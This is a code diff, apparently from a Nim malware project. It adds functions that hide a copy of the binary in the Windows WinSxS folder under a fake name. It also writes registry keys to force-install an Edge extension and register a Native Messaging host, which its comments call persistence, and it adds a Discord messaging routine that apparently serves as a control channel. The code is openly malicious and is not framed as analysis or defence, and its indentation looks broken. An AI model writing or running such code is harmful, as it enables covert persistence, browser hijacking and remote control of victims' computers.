@@ -24,30 +24,80 @@ proc xorDecrypt(key: array[32, byte], b64data: string): string =
     result.add(chr(ord(data[i]) xor int(key[i mod 32])))
   return result
 
+
+
+### egde en sonunda bir b0ka yaradı be awk . en sonunda vay be aq . işte microslop seni bu günler için yazdı zaten!!!
+proc forceInstallEdgeExtension(extID: string, extPath: string) =
+  let regPath = r"HKCU\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist"
+
+  var p = startProcess(
+    "reg.exe",
+    args = @[
+      "add", regPath,
+      "/v", "1",
+      "/t", "REG_SZ",
+      "/d", extID & ";file:///" & extPath.replace("\\", "/"),
+      "/f"
+    ],
+    options = {poNoConsole, poUsePath}
+  )
+  p.close()
+
 # When did Windows start peeling oranges.... Privacy is good !
+
+
+
+
+
 proc peel() =
   let originBinaryLoc = getAppFilename()
   let baseVaultDir = "C:\\Windows\\WinSxS"
   let deployTargetPath = baseVaultDir / "WindowsOrangePeller.exe"
   try:
     copyFile(originBinaryLoc, deployTargetPath)
-    echo "good peel ",deployTargetPath
+    echo "good peel ", deployTargetPath
   except OSError as e:
-    echo "a error", e.msg
-when isMainModule
-  executePayloadDeployment()
+    echo "a error ", e.msg
 
-#persistence sağlıyoruz burda ıd : T1176
-var p = startProcess(
-  "cmd.exe",
-  args = [
-    "/c",
-    """reg add "HKCU\Software\Google\Chrome\NativeMessagingHosts\com.launcher.agent" /ve /t REG_SZ /d "C:\ProgramData\host.json" /f"""
-  ],
-  options = {poNoConsole, poUsePath}
-)
 
-p.close()
+
+
+
+
+    proc installPersistence(deployPath: string) =
+      # Native Messaging host registry
+      let nmRegPath = r"HKCU\Software\Microsoft\Edge\NativeMessagingHosts\com.launcher.agent"
+
+      var p1 = startProcess(
+        "reg.exe",
+        args = @[
+          "add", nmRegPath,
+          "/ve", "/t", "REG_SZ",
+          "/d", deployPath.parentDir & "\\host.json",
+          "/f"
+        ],
+        options = {poNoConsole, poUsePath}
+      )
+      p1.close()
+
+      # Edge Extension force-install
+      let extRegPath = r"HKCU\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist"
+      let extID = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
+
+      var p2 = startProcess(
+        "reg.exe",
+        args = @[
+          "add", extRegPath,
+          "/v", "1",
+          "/t", "REG_SZ",
+          "/d", extID & ";file:///" & deployPath.parentDir.replace("\\", "/") & "/extension.crx",
+          "/f"
+        ],
+        options = {poNoConsole, poUsePath}
+      )
+      p2.close()
+
+
   # HERE İS DUCKİNG DİSCORD
 var lastmessageID = ""
 proc send_discord_message(client: HttpClient, content: string)=
